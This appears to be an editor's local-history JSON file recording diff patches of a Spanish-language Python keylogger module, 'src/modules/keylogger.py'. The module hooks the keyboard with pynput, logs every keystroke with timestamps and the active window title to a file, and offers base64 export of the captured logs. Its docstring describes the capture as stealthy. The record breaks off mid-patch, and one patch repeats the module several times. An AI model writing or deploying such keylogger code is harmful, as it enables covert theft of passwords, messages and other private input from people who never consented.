{
    "sourceFile": "src/modules/keylogger.py",
    "activeCommit": 0,
    "commits": [
        {
            "activePatchIndex": 9,
            "patches": [
                {
                    "date": 1740261785531,
                    "content": "Index: \n===================================================================\n--- \n+++ \n"
                },
                {
                    "date": 1740261804446,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -0,0 +1,200 @@\n+\"\"\"\r\n+Módulo de keylogging.\r\n+Proporciona funcionalidades para capturar y gestionar pulsaciones de teclas\r\n+de manera sigilosa y eficiente.\r\n+\"\"\"\r\n+\r\n+import threading\r\n+import time\r\n+import logging\r\n+import os\r\n+from datetime import datetime\r\n+from pynput import keyboard\r\n+import base64\r\n+import json\r\n+\r\n+class Keylogger:\r\n+    def __init__(self, log_dir=\"keylog\"):\r\n+        \"\"\"\r\n+        Inicializa el keylogger.\r\n+        \r\n+        Args:\r\n+            log_dir (str): Directorio donde se guardarán los logs\r\n+        \"\"\"\r\n+        self.log_dir = log_dir\r\n+        self.current_log = []\r\n+        self.running = False\r\n+        self.current_window = None\r\n+        self.start_time = None\r\n+        self.log_file = None\r\n+        self._setup_logging()\r\n+        \r\n+    def _setup_logging(self):\r\n+        \"\"\"Configura el sistema de logging.\"\"\"\r\n+        try:\r\n+            if not os.path.exists(self.log_dir):\r\n+                os.makedirs(self.log_dir)\r\n+            self.log_file = os.path.join(\r\n+                self.log_dir,\r\n+                f\"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt\"\r\n+            )\r\n+        except Exception as e:\r\n+            logging.error(f\"Error configurando keylogger: {e}\")\r\n+\r\n+    def _on_press(self, key):\r\n+        \"\"\"Callback para cuando se presiona una tecla.\"\"\"\r\n+        try:\r\n+            if not self.running:\r\n+                return False\r\n+                \r\n+            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')\r\n+            \r\n+            try:\r\n+                # Teclas normales\r\n+                key_char = key.char\r\n+            except AttributeError:\r\n+                # Teclas especiales\r\n+                key_char = str(key)\r\n+            \r\n+            key_data = {\r\n+                \"timestamp\": timestamp,\r\n+                \"key\": key_char,\r\n+                \"window\": self.current_window,\r\n+                \"type\": \"press\"\r\n+            }\r\n+            \r\n+            self.current_log.append(key_data)\r\n+            self._write_to_file(key_data)\r\n+            \r\n+        except Exception as e:\r\n+            logging.error(f\"Error en keylogger: {e}\")\r\n+\r\n+    def _write_to_file(self, key_data):\r\n+        \"\"\"Escribe los datos de tecla al archivo.\"\"\"\r\n+        try:\r\n+            with open(self.log_file, \"a\", encoding=\"utf-8\") as f:\r\n+                f.write(json.dumps(key_data) + \"\\n\")\r\n+        except Exception as e:\r\n+            logging.error(f\"Error escribiendo log: {e}\")\r\n+\r\n+    def start(self):\r\n+        \"\"\"Inicia el keylogger.\"\"\"\r\n+        try:\r\n+            self.running = True\r\n+            self.start_time = datetime.now()\r\n+            self.listener = keyboard.Listener(on_press=self._on_press)\r\n+            self.listener.start()\r\n+            \r\n+            # Iniciar thread para actualizar ventana actual\r\n+            self.window_thread = threading.Thread(target=self._update_current_window)\r\n+            self.window_thread.daemon = True\r\n+            self.window_thread.start()\r\n+            \r\n+            return {\"success\": True}\r\n+        except Exception as e:\r\n+            return {\"success\": False, \"error\": str(e)}\r\n+\r\n+    def stop(self):\r\n+        \"\"\"Detiene el keylogger.\"\"\"\r\n+        try:\r\n+            self.running = False\r\n+            if hasattr(self, 'listener'):\r\n+                self.listener.stop()\r\n+            return {\"success\": True}\r\n+        except Exception as e:\r\n+            return {\"success\": False, \"error\": str(e)}\r\n+\r\n+    def get_logs(self, format=\"text\"):\r\n+        \"\"\"\r\n+        Obtiene los logs capturados.\r\n+        \r\n+        Args:\r\n+            format (str): Formato de salida (\"text\", \"json\", \"base64\")\r\n+        \r\n+        Returns:\r\n+            dict: Resultado con los logs en el formato especificado\r\n+        \"\"\"\r\n+        try:\r\n+            if format == \"json\":\r\n+                return {\r\n+                    \"success\": True,\r\n+                    \"data\": self.current_log\r\n+                }\r\n+            elif format == \"base64\":\r\n+                with open(self.log_file, 'rb') as f:\r\n+                    return {\r\n+                        \"success\": True,\r\n+                        \"data\": base64.b64encode(f.read()).decode()\r\n+                    }\r\n+            else:  # text\r\n+                log_text = \"\"\r\n+                for entry in self.current_log:\r\n+                    log_text += f\"{entry['timestamp']} [{entry['window']}] - {entry['key']}\\n\"\r\n+                return {\r\n+                    \"success\": True,\r\n+                    \"data\": log_text\r\n+                }\r\n+        except Exception as e:\r\n+            return {\"success\": False, \"error\": str(e)}\r\n+\r\n+    def _update_current_window(self):\r\n+        \"\"\"Actualiza el título de la ventana actual.\"\"\"\r\n+        try:\r\n+            if os.name == 'nt':\r\n+                import win32gui\r\n+                while self.running:\r\n+                    try:\r\n+                        window = win32gui.GetWindowText(win32gui.GetForegroundWindow())\r\n+                        if window != self.current_window:\r\n+                            self.current_window = window\r\n+                    except:\r\n+                        pass\r\n+                    time.sleep(0.1)\r\n+            else:\r\n+                # Para Linux necesitaríamos usar Xlib\r\n+                pass\r\n+        except Exception as e:\r\n+            logging.error(f\"Error actualizando ventana: {e}\")\r\n+\r\n+    def clear_logs(self):\r\n+        \"\"\"Limpia los logs almacenados.\"\"\"\r\n+        try:\r\n+            self.current_log = []\r\n+            if os.path.exists(self.log_file):\r\n+                os.remove(self.log_file)\r\n+            self._setup_logging()\r\n+            return {\"success\": True}\r\n+        except Exception as e:\r\n+            return {\"success\": False, \"error\": str(e)}\r\n+\r\n+    @property\r\n+    def is_running(self):\r\n+        \"\"\"Indica si el keylogger está activo.\"\"\"\r\n+        return self.running\r\n+\r\n+    def get_stats(self):\r\n+        \"\"\"Obtiene estadísticas del keylogger.\"\"\"\r\n+        try:\r\n+            if not self.start_time:\r\n+                return {\"success\": False, \"error\": \"Keylogger no iniciado\"}\r\n+                \r\n+            tiempo_total = datetime.now() - self.start_time\r\n+            total_keys = len(self.current_log)\r\n+            \r\n+            # Agrupar por ventanas\r\n+            ventanas = {}\r\n+            for log in self.current_log:\r\n+                window = log['window']\r\n+                ventanas[window] = ventanas.get(window, 0) + 1\r\n+            \r\n+            return {\r\n+                \"success\": True,\r\n+                \"stats\": {\r\n+                    \"tiempo_ejecucion\": str(tiempo_total),\r\n+                    \"total_teclas\": total_keys,\r\n+                    \"teclas_por_ventana\": ventanas,\r\n+                    \"archivo_log\": self.log_file\r\n+                }\r\n+            }\r\n+        except Exception as e:\r\n+            return {\"success\": False, \"error\": str(e)}\r\n"
                },
                {
                    "date": 1740261882253,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -0,0 +1,211 @@\n+\"\"\"\r\n+Módulo de keylogging.\r\n+Proporciona funcionalidades para capturar y gestionar pulsaciones de teclas\r\n+de manera sigilosa y eficiente.\r\n+\"\"\"\r\n+\r\n+import threading\r\n+import time\r\n+import logging\r\n+import os\r\n+from datetime import datetime\r\n+from pynput import keyboard\r\n+import base64\r\n+import json\r\n+\r\n+class Keylogger:\r\n+    def __init__(self, log_dir=\"keylog\"):\r\n+        \"\"\"\r\n+        Inicializa el keylogger.\r\n+        \r\n+        Args:\r\n+            log_dir (str): Directorio donde se guardarán los logs\r\n+        \"\"\"\r\n+        self.log_dir = log_dir\r\n+        self.current_log = []\r\n+        self.running = False\r\n+        self.current_window = None\r\n+        self.start_time = None\r\n+        self.log_file = None\r\n+        self._setup_logging()\r\n+        \r\n+    def _setup_logging(self):\r\n+        \"\"\"Configura el sistema de logging.\"\"\"\r\n+        try:\r\n+            if not os.path.exists(self.log_dir):\r\n+                os.makedirs(self.log_dir)\r\n+            self.log_file = os.path.join(\r\n+                self.log_dir,\r\n+                f\"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt\"\r\n+            )\r\n+        except Exception as e:\r\n+            logging.error(f\"Error configurando keylogger: {e}\")\r\n+\r\n+    def _on_press(self, key):\r\n+        \"\"\"Callback para cuando se presiona una tecla.\"\"\"\r\n+        try:\r\n+            if not self.running:\r\n+                return False\r\n+                \r\n+            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')\r\n+            \r\n+            try:\r\n+                # Teclas normales\r\n+                key_char = key.char\r\n+            except AttributeError:\r\n+                # Teclas especiales\r\n+                key_char = str(key)\r\n+            \r\n+            key_data = {\r\n+                \"timestamp\": timestamp,\r\n+                \"key\": key_char,\r\n+                \"window\": self.current_window,\r\n+                \"type\": \"press\"\r\n+            }\r\n+            \r\n+            self.current_log.append(key_data)\r\n+            self._write_to_file(key_data)\r\n+            \r\n+        except Exception as e:\r\n+            logging.error(f\"Error en keylogger: {e}\")\r\n+\r\n+    def _write_to_file(self, key_data):\r\n+        \"\"\"Escribe los datos de tecla al archivo.\"\"\"\r\n+        try:\r\n+            with open(self.log_file, \"a\", encoding=\"utf-8\") as f:\r\n+                f.write(json.dumps(key_data) + \"\\n\")\r\n+        except Exception as e:\r\n+            logging.error(f\"Error escribiendo log: {e}\")\r\n+\r\n+    def start(self):\r\n+        \"\"\"Inicia el keylogger.\"\"\"\r\n+        try:\r\n+            self.running = True\r\n+            self.start_time = datetime.now()\r\n+            self.listener = keyboard.Listener(on_press=self._on_press)\r\n+            self.listener.start()\r\n+            \r\n+            # Iniciar thread para actualizar ventana actual\r\n+            self.window_thread = threading.Thread(target=self._update_current_window)\r\n+            self.window_thread.daemon = True\r\n+            self.window_thread.start()\r\n+            \r\n+            return {\"success\": True}\r\n+        except Exception as e:\r\n+            return {\"success\": False, \"error\": str(e)}\r\n+\r\n+    def stop(self):\r\n+        \"\"\"Detiene el keylogger.\"\"\"\r\n+        try:\r\n+            self.running = False\r\n+            if hasattr(self, 'listener'):\r\n+                self.listener.stop()\r\n+            return {\"success\": True}\r\n+        except Exception as e:\r\n+            return {\"success\": False, \"error\": str(e)}\r\n+\r\n+    def get_logs(self, format=\"text\"):\r\n+        \"\"\"\r\n+        Obtiene los logs capturados.\r\n+        \r\n+        Args:\r\n+            format (str): Formato de salida (\"text\", \"json\", \"base64\")\r\n+        \r\n+        Returns:\r\n+            dict: Resultado con los logs en el formato especificado\r\n+        \"\"\"\r\n+        try:\r\n+            if format == \"json\":\r\n+                return {\r\n+                    \"success\": True,\r\n+                    \"data\": self.current_log\r\n+                }\r\n+            elif format == \"base64\":\r\n+                with open(self.log_file, 'rb') as f:\r\n+                    return {\r\n+                        \"success\": True,\r\n+                        \"data\": base64.b64encode(f.read()).decode()\r\n+                    }\r\n+            else:  # text\r\n+                log_text = \"\"\r\n+                for entry in self.current_log:\r\n+                    log_text += f\"{entry['timestamp']} [{entry['window']}] - {entry['key']}\\n\"\r\n+                return {\r\n+                    \"success\": True,\r\n+                    \"data\": log_text\r\n+                }\r\n+        except Exception as e:\r\n+            return {\"success\": False, \"error\": str(e)}\r\n+\r\n+    def _update_current_window(self):\r\n+        \"\"\"Actualiza el título de la ventana actual.\"\"\"\r\n+        try:\r\n+            if os.name == 'nt':\r\n+                import win32gui\r\n+                import win32process\r\n+                import win32con\r\n+                while self.running:\r\n+                    try:\r\n+                        hwnd = win32gui.GetForegroundWindow()\r\n+                        _, pid = win32process.GetWindowThreadProcessId(hwnd)\r\n+                        window_title = win32gui.GetWindowText(hwnd)\r\n+                        if window_title != self.current_window:\r\n+                            self.current_window = window_title\r\n+                    except:\r\n+                        pass\r\n+                    time.sleep(0.1)\r\n+            else:\r\n+                # Para Linux\r\n+                try:\r\n+                    import Xlib\r\n+                    import Xlib.display\r\n+                    # Implementación para Linux aquí\r\n+                    pass\r\n+                except ImportError:\r\n+                    logging.warning(\"Xlib no instalado. La detección de ventanas en Linux no estará disponible.\")\r\n+                    pass\r\n+        except Exception as e:\r\n+            logging.error(f\"Error actualizando ventana: {e}\")\r\n+\r\n+    def clear_logs(self):\r\n+        \"\"\"Limpia los logs almacenados.\"\"\"\r\n+        try:\r\n+            self.current_log = []\r\n+            if os.path.exists(self.log_file):\r\n+                os.remove(self.log_file)\r\n+            self._setup_logging()\r\n+            return {\"success\": True}\r\n+        except Exception as e:\r\n+            return {\"success\": False, \"error\": str(e)}\r\n+\r\n+    @property\r\n+    def is_running(self):\r\n+        \"\"\"Indica si el keylogger está activo.\"\"\"\r\n+        return self.running\r\n+\r\n+    def get_stats(self):\r\n+        \"\"\"Obtiene estadísticas del keylogger.\"\"\"\r\n+        try:\r\n+            if not self.start_time:\r\n+                return {\"success\": False, \"error\": \"Keylogger no iniciado\"}\r\n+                \r\n+            tiempo_total = datetime.now() - self.start_time\r\n+            total_keys = len(self.current_log)\r\n+            \r\n+            # Agrupar por ventanas\r\n+            ventanas = {}\r\n+            for log in self.current_log:\r\n+                window = log['window']\r\n+                ventanas[window] = ventanas.get(window, 0) + 1\r\n+            \r\n+            return {\r\n+                \"success\": True,\r\n+                \"stats\": {\r\n+                    \"tiempo_ejecucion\": str(tiempo_total),\r\n+                    \"total_teclas\": total_keys,\r\n+                    \"teclas_por_ventana\": ventanas,\r\n+                    \"archivo_log\": self.log_file\r\n+                }\r\n+            }\r\n+        except Exception as e:\r\n+            return {\"success\": False, \"error\": str(e)}\r\n"
                },
                {
                    "date": 1740261914221,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -208,404 +208,4 @@\n                 }\r\n             }\r\n         except Exception as e:\r\n             return {\"success\": False, \"error\": str(e)}\r\n-\"\"\"\r\n-Módulo de keylogging.\r\n-Proporciona funcionalidades para capturar y gestionar pulsaciones de teclas\r\n-de manera sigilosa y eficiente.\r\n-\"\"\"\r\n-\r\n-import threading\r\n-import time\r\n-import logging\r\n-import os\r\n-from datetime import datetime\r\n-from pynput import keyboard\r\n-import base64\r\n-import json\r\n-\r\n-class Keylogger:\r\n-    def __init__(self, log_dir=\"keylog\"):\r\n-        \"\"\"\r\n-        Inicializa el keylogger.\r\n-        \r\n-        Args:\r\n-            log_dir (str): Directorio donde se guardarán los logs\r\n-        \"\"\"\r\n-        self.log_dir = log_dir\r\n-        self.current_log = []\r\n-        self.running = False\r\n-        self.current_window = None\r\n-        self.start_time = None\r\n-        self.log_file = None\r\n-        self._setup_logging()\r\n-        \r\n-    def _setup_logging(self):\r\n-        \"\"\"Configura el sistema de logging.\"\"\"\r\n-        try:\r\n-            if not os.path.exists(self.log_dir):\r\n-                os.makedirs(self.log_dir)\r\n-            self.log_file = os.path.join(\r\n-                self.log_dir,\r\n-                f\"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt\"\r\n-            )\r\n-        except Exception as e:\r\n-            logging.error(f\"Error configurando keylogger: {e}\")\r\n-\r\n-    def _on_press(self, key):\r\n-        \"\"\"Callback para cuando se presiona una tecla.\"\"\"\r\n-        try:\r\n-            if not self.running:\r\n-                return False\r\n-                \r\n-            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')\r\n-            \r\n-            try:\r\n-                # Teclas normales\r\n-                key_char = key.char\r\n-            except AttributeError:\r\n-                # Teclas especiales\r\n-                key_char = str(key)\r\n-            \r\n-            key_data = {\r\n-                \"timestamp\": timestamp,\r\n-                \"key\": key_char,\r\n-                \"window\": self.current_window,\r\n-                \"type\": \"press\"\r\n-            }\r\n-            \r\n-            self.current_log.append(key_data)\r\n-            self._write_to_file(key_data)\r\n-            \r\n-        except Exception as e:\r\n-            logging.error(f\"Error en keylogger: {e}\")\r\n-\r\n-    def _write_to_file(self, key_data):\r\n-        \"\"\"Escribe los datos de tecla al archivo.\"\"\"\r\n-        try:\r\n-            with open(self.log_file, \"a\", encoding=\"utf-8\") as f:\r\n-                f.write(json.dumps(key_data) + \"\\n\")\r\n-        except Exception as e:\r\n-            logging.error(f\"Error escribiendo log: {e}\")\r\n-\r\n-    def start(self):\r\n-        \"\"\"Inicia el keylogger.\"\"\"\r\n-        try:\r\n-            self.running = True\r\n-            self.start_time = datetime.now()\r\n-            self.listener = keyboard.Listener(on_press=self._on_press)\r\n-            self.listener.start()\r\n-            \r\n-            # Iniciar thread para actualizar ventana actual\r\n-            self.window_thread = threading.Thread(target=self._update_current_window)\r\n-            self.window_thread.daemon = True\r\n-            self.window_thread.start()\r\n-            \r\n-            return {\"success\": True}\r\n-        except Exception as e:\r\n-            return {\"success\": False, \"error\": str(e)}\r\n-\r\n-    def stop(self):\r\n-        \"\"\"Detiene el keylogger.\"\"\"\r\n-        try:\r\n-            self.running = False\r\n-            if hasattr(self, 'listener'):\r\n-                self.listener.stop()\r\n-            return {\"success\": True}\r\n-        except Exception as e:\r\n-            return {\"success\": False, \"error\": str(e)}\r\n-\r\n-    def get_logs(self, format=\"text\"):\r\n-        \"\"\"\r\n-        Obtiene los logs capturados.\r\n-        \r\n-        Args:\r\n-            format (str): Formato de salida (\"text\", \"json\", \"base64\")\r\n-        \r\n-        Returns:\r\n-            dict: Resultado con los logs en el formato especificado\r\n-        \"\"\"\r\n-        try:\r\n-            if format == \"json\":\r\n-                return {\r\n-                    \"success\": True,\r\n-                    \"data\": self.current_log\r\n-                }\r\n-            elif format == \"base64\":\r\n-                with open(self.log_file, 'rb') as f:\r\n-                    return {\r\n-                        \"success\": True,\r\n-                        \"data\": base64.b64encode(f.read()).decode()\r\n-                    }\r\n-            else:  # text\r\n-                log_text = \"\"\r\n-                for entry in self.current_log:\r\n-                    log_text += f\"{entry['timestamp']} [{entry['window']}] - {entry['key']}\\n\"\r\n-                return {\r\n-                    \"success\": True,\r\n-                    \"data\": log_text\r\n-                }\r\n-        except Exception as e:\r\n-            return {\"success\": False, \"error\": str(e)}\r\n-\r\n-    def _update_current_window(self):\r\n-        \"\"\"Actualiza el título de la ventana actual.\"\"\"\r\n-        try:\r\n-            if os.name == 'nt':\r\n-                import win32gui\r\n-                while self.running:\r\n-                    try:\r\n-                        window = win32gui.GetWindowText(win32gui.GetForegroundWindow())\r\n-                        if window != self.current_window:\r\n-                            self.current_window = window\r\n-                    except:\r\n-                        pass\r\n-                    time.sleep(0.1)\r\n-            else:\r\n-                # Para Linux necesitaríamos usar Xlib\r\n-                pass\r\n-        except Exception as e:\r\n-            logging.error(f\"Error actualizando ventana: {e}\")\r\n-\r\n-    def clear_logs(self):\r\n-        \"\"\"Limpia los logs almacenados.\"\"\"\r\n-        try:\r\n-            self.current_log = []\r\n-            if os.path.exists(self.log_file):\r\n-                os.remove(self.log_file)\r\n-            self._setup_logging()\r\n-            return {\"success\": True}\r\n-        except Exception as e:\r\n-            return {\"success\": False, \"error\": str(e)}\r\n-\r\n-    @property\r\n-    def is_running(self):\r\n-        \"\"\"Indica si el keylogger está activo.\"\"\"\r\n-        return self.running\r\n-\r\n-    def get_stats(self):\r\n-        \"\"\"Obtiene estadísticas del keylogger.\"\"\"\r\n-        try:\r\n-            if not self.start_time:\r\n-                return {\"success\": False, \"error\": \"Keylogger no iniciado\"}\r\n-                \r\n-            tiempo_total = datetime.now() - self.start_time\r\n-            total_keys = len(self.current_log)\r\n-            \r\n-            # Agrupar por ventanas\r\n-            ventanas = {}\r\n-            for log in self.current_log:\r\n-                window = log['window']\r\n-                ventanas[window] = ventanas.get(window, 0) + 1\r\n-            \r\n-            return {\r\n-                \"success\": True,\r\n-                \"stats\": {\r\n-                    \"tiempo_ejecucion\": str(tiempo_total),\r\n-                    \"total_teclas\": total_keys,\r\n-                    \"teclas_por_ventana\": ventanas,\r\n-                    \"archivo_log\": self.log_file\r\n-                }\r\n-            }\r\n-        except Exception as e:\r\n-            return {\"success\": False, \"error\": str(e)}\r\n-\"\"\"\r\n-Módulo de keylogging.\r\n-Proporciona funcionalidades para capturar y gestionar pulsaciones de teclas\r\n-de manera sigilosa y eficiente.\r\n-\"\"\"\r\n-\r\n-import threading\r\n-import time\r\n-import logging\r\n-import os\r\n-from datetime import datetime\r\n-from pynput import keyboard\r\n-import base64\r\n-import json\r\n-\r\n-class Keylogger:\r\n-    def __init__(self, log_dir=\"keylog\"):\r\n-        \"\"\"\r\n-        Inicializa el keylogger.\r\n-        \r\n-        Args:\r\n-            log_dir (str): Directorio donde se guardarán los logs\r\n-        \"\"\"\r\n-        self.log_dir = log_dir\r\n-        self.current_log = []\r\n-        self.running = False\r\n-        self.current_window = None\r\n-        self.start_time = None\r\n-        self.log_file = None\r\n-        self._setup_logging()\r\n-        \r\n-    def _setup_logging(self):\r\n-        \"\"\"Configura el sistema de logging.\"\"\"\r\n-        try:\r\n-            if not os.path.exists(self.log_dir):\r\n-                os.makedirs(self.log_dir)\r\n-            self.log_file = os.path.join(\r\n-                self.log_dir,\r\n-                f\"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt\"\r\n-            )\r\n-        except Exception as e:\r\n-            logging.error(f\"Error configurando keylogger: {e}\")\r\n-\r\n-    def _on_press(self, key):\r\n-        \"\"\"Callback para cuando se presiona una tecla.\"\"\"\r\n-        try:\r\n-            if not self.running:\r\n-                return False\r\n-                \r\n-            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')\r\n-            \r\n-            try:\r\n-                # Teclas normales\r\n-                key_char = key.char\r\n-            except AttributeError:\r\n-                # Teclas especiales\r\n-                key_char = str(key)\r\n-            \r\n-            key_data = {\r\n-                \"timestamp\": timestamp,\r\n-                \"key\": key_char,\r\n-                \"window\": self.current_window,\r\n-                \"type\": \"press\"\r\n-            }\r\n-            \r\n-            self.current_log.append(key_data)\r\n-            self._write_to_file(key_data)\r\n-            \r\n-        except Exception as e:\r\n-            logging.error(f\"Error en keylogger: {e}\")\r\n-\r\n-    def _write_to_file(self, key_data):\r\n-        \"\"\"Escribe los datos de tecla al archivo.\"\"\"\r\n-        try:\r\n-            with open(self.log_file, \"a\", encoding=\"utf-8\") as f:\r\n-                f.write(json.dumps(key_data) + \"\\n\")\r\n-        except Exception as e:\r\n-            logging.error(f\"Error escribiendo log: {e}\")\r\n-\r\n-    def start(self):\r\n-        \"\"\"Inicia el keylogger.\"\"\"\r\n-        try:\r\n-            self.running = True\r\n-            self.start_time = datetime.now()\r\n-            self.listener = keyboard.Listener(on_press=self._on_press)\r\n-            self.listener.start()\r\n-            \r\n-            # Iniciar thread para actualizar ventana actual\r\n-            self.window_thread = threading.Thread(target=self._update_current_window)\r\n-            self.window_thread.daemon = True\r\n-            self.window_thread.start()\r\n-            \r\n-            return {\"success\": True}\r\n-        except Exception as e:\r\n-            return {\"success\": False, \"error\": str(e)}\r\n-\r\n-    def stop(self):\r\n-        \"\"\"Detiene el keylogger.\"\"\"\r\n-        try:\r\n-            self.running = False\r\n-            if hasattr(self, 'listener'):\r\n-                self.listener.stop()\r\n-            return {\"success\": True}\r\n-        except Exception as e:\r\n-            return {\"success\": False, \"error\": str(e)}\r\n-\r\n-    def get_logs(self, format=\"text\"):\r\n-        \"\"\"\r\n-        Obtiene los logs capturados.\r\n-        \r\n-        Args:\r\n-            format (str): Formato de salida (\"text\", \"json\", \"base64\")\r\n-        \r\n-        Returns:\r\n-            dict: Resultado con los logs en el formato especificado\r\n-        \"\"\"\r\n-        try:\r\n-            if format == \"json\":\r\n-                return {\r\n-                    \"success\": True,\r\n-                    \"data\": self.current_log\r\n-                }\r\n-            elif format == \"base64\":\r\n-                with open(self.log_file, 'rb') as f:\r\n-                    return {\r\n-                        \"success\": True,\r\n-                        \"data\": base64.b64encode(f.read()).decode()\r\n-                    }\r\n-            else:  # text\r\n-                log_text = \"\"\r\n-                for entry in self.current_log:\r\n-                    log_text += f\"{entry['timestamp']} [{entry['window']}] - {entry['key']}\\n\"\r\n-                return {\r\n-                    \"success\": True,\r\n-                    \"data\": log_text\r\n-                }\r\n-        except Exception as e:\r\n-            return {\"success\": False, \"error\": str(e)}\r\n-\r\n-    def _update_current_window(self):\r\n-        \"\"\"Actualiza el título de la ventana actual.\"\"\"\r\n-        try:\r\n-            if os.name == 'nt':\r\n-                import win32gui\r\n-                while self.running:\r\n-                    try:\r\n-                        window = win32gui.GetWindowText(win32gui.GetForegroundWindow())\r\n-                        if window != self.current_window:\r\n-                            self.current_window = window\r\n-                    except:\r\n-                        pass\r\n-                    time.sleep(0.1)\r\n-            else:\r\n-                # Para Linux necesitaríamos usar Xlib\r\n-                pass\r\n-        except Exception as e:\r\n-            logging.error(f\"Error actualizando ventana: {e}\")\r\n-\r\n-    def clear_logs(self):\r\n-        \"\"\"Limpia los logs almacenados.\"\"\"\r\n-        try:\r\n-            self.current_log = []\r\n-            if os.path.exists(self.log_file):\r\n-                os.remove(self.log_file)\r\n-            self._setup_logging()\r\n-            return {\"success\": True}\r\n-        except Exception as e:\r\n-            return {\"success\": False, \"error\": str(e)}\r\n-\r\n-    @property\r\n-    def is_running(self):\r\n-        \"\"\"Indica si el keylogger está activo.\"\"\"\r\n-        return self.running\r\n-\r\n-    def get_stats(self):\r\n-        \"\"\"Obtiene estadísticas del keylogger.\"\"\"\r\n-        try:\r\n-            if not self.start_time:\r\n-                return {\"success\": False, \"error\": \"Keylogger no iniciado\"}\r\n-                \r\n-            tiempo_total = datetime.now() - self.start_time\r\n-            total_keys = len(self.current_log)\r\n-            \r\n-            # Agrupar por ventanas\r\n-            ventanas = {}\r\n-            for log in self.current_log:\r\n-                window = log['window']\r\n-                ventanas[window] = ventanas.get(window, 0) + 1\r\n-            \r\n-            return {\r\n-                \"success\": True,\r\n-                \"stats\": {\r\n-                    \"tiempo_ejecucion\": str(tiempo_total),\r\n-                    \"total_teclas\": total_keys,\r\n-                    \"teclas_por_ventana\": ventanas,\r\n-                    \"archivo_log\": self.log_file\r\n-                }\r\n-            }\r\n-        except Exception as e:\r\n-            return {\"success\": False, \"error\": str(e)}\r\n"
                },
                {
                    "date": 1740261921699,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -0,0 +1,211 @@\n+\"\"\"\r\n+Módulo de keylogging.\r\n+Proporciona funcionalidades para capturar y gestionar pulsaciones de teclas\r\n+de manera sigilosa y eficiente.\r\n+\"\"\"\r\n+\r\n+import threading\r\n+import time\r\n+import logging\r\n+import os\r\n+from datetime import datetime\r\n+from pynput import keyboard\r\n+import base64\r\n+import json\r\n+\r\n+class Keylogger:\r\n+    def __init__(self, log_dir=\"keylog\"):\r\n+        \"\"\"\r\n+        Inicializa el keylogger.\r\n+        \r\n+        Args:\r\n+            log_dir (str): Directorio donde se guardarán los logs\r\n+        \"\"\"\r\n+        self.log_dir = log_dir\r\n+        self.current_log = []\r\n+        self.running = False\r\n+        self.current_window = None\r\n+        self.start_time = None\r\n+        self.log_file = None\r\n+        self._setup_logging()\r\n+        \r\n+    def _setup_logging(self):\r\n+        \"\"\"Configura el sistema de logging.\"\"\"\r\n+        try:\r\n+            if not os.path.exists(self.log_dir):\r\n+                os.makedirs(self.log_dir)\r\n+            self.log_file = os.path.join(\r\n+                self.log_dir,\r\n+                f\"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt\"\r\n+            )\r\n+        except Exception as e:\r\n+            logging.error(f\"Error configurando keylogger: {e}\")\r\n+\r\n+    def _on_press(self, key):\r\n+        \"\"\"Callback para cuando se presiona una tecla.\"\"\"\r\n+        try:\r\n+            if not self.running:\r\n+                return False\r\n+                \r\n+            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')\r\n+            \r\n+            try:\r\n+                # Teclas normales\r\n+                key_char = key.char\r\n+            except AttributeError:\r\n+                # Teclas especiales\r\n+                key_char = str(key)\r\n+            \r\n+            key_data = {\r\n+                \"timestamp\": timestamp,\r\n+                \"key\": key_char,\r\n+                \"window\": self.current_window,\r\n+                \"type\": \"press\"\r\n+            }\r\n+            \r\n+            self.current_log.append(key_data)\r\n+            self._write_to_file(key_data)\r\n+            \r\n+        except Exception as e:\r\n+            logging.error(f\"Error en keylogger: {e}\")\r\n+\r\n+    def _write_to_file(self, key_data):\r\n+        \"\"\"Escribe los datos de tecla al archivo.\"\"\"\r\n+        try:\r\n+            with open(self.log_file, \"a\", encoding=\"utf-8\") as f:\r\n+                f.write(json.dumps(key_data) + \"\\n\")\r\n+        except Exception as e:\r\n+            logging.error(f\"Error escribiendo log: {e}\")\r\n+\r\n+    def start(self):\r\n+        \"\"\"Inicia el keylogger.\"\"\"\r\n+        try:\r\n+            self.running = True\r\n+            self.start_time = datetime.now()\r\n+            self.listener = keyboard.Listener(on_press=self._on_press)\r\n+            self.listener.start()\r\n+            \r\n+            # Iniciar thread para actualizar ventana actual\r\n+            self.window_thread = threading.Thread(target=self._update_current_window)\r\n+            self.window_thread.daemon = True\r\n+            self.window_thread.start()\r\n+            \r\n+            return {\"success\": True}\r\n+        except Exception as e:\r\n+            return {\"success\": False, \"error\": str(e)}\r\n+\r\n+    def stop(self):\r\n+        \"\"\"Detiene el keylogger.\"\"\"\r\n+        try:\r\n+            self.running = False\r\n+            if hasattr(self, 'listener'):\r\n+                self.listener.stop()\r\n+            return {\"success\": True}\r\n+        except Exception as e:\r\n+            return {\"success\": False, \"error\": str(e)}\r\n+\r\n+    def get_logs(self, format=\"text\"):\r\n+        \"\"\"\r\n+        Obtiene los logs capturados.\r\n+        \r\n+        Args:\r\n+            format (str): Formato de salida (\"text\", \"json\", \"base64\")\r\n+        \r\n+        Returns:\r\n+            dict: Resultado con los logs en el formato especificado\r\n+        \"\"\"\r\n+        try:\r\n+            if format == \"json\":\r\n+                return {\r\n+                    \"success\": True,\r\n+                    \"data\": self.current_log\r\n+                }\r\n+            elif format == \"base64\":\r\n+                with open(self.log_file, 'rb') as f:\r\n+                    return {\r\n+                        \"success\": True,\r\n+                        \"data\": base64.b64encode(f.read()).decode()\r\n+                    }\r\n+            else:  # text\r\n+                log_text = \"\"\r\n+                for entry in self.current_log:\r\n+                    log_text += f\"{entry['timestamp']} [{entry['window']}] - {entry['key']}\\n\"\r\n+                return {\r\n+                    \"success\": True,\r\n+                    \"data\": log_text\r\n+                }\r\n+        except Exception as e:\r\n+            return {\"success\": False, \"error\": str(e)}\r\n+\r\n+    def _update_current_window(self):\r\n+        